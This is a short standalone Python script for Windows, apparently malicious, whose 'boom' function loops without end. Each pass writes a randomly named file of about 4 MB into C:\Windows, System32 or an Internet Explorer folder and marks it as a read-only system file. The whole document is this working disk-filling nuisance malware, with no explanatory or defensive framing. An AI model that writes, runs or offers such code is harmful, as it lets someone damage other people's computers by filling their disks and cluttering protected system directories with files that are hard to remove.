from random import randint
from os.path import join
from time import sleep
import win32con, win32api


def boom():
    directory = ['C:\Program Files (x86)\Internet Explorer\zh-CN',
                 'C:\Windows',
                 'C:\Windows\System32']
    while True:
        try:
            name = str(randint(0, 1000000000))
            dir = directory[randint(0, len(directory) - 1)]
            with open(join(dir, name), 'w') as file:
                file.seek(1024 * 1024 * 1 * 4)
                file.write(name)
                win32api.SetFileAttributes(join(dir, name), win32con.FILE_ATTRIBUTE_READONLY)
                win32api.SetFileAttributes(join(dir, name), win32con.FILE_ATTRIBUTE_SYSTEM)
                sleep(3)
        except:
            break


if __name__ == '__main__':
    boom()
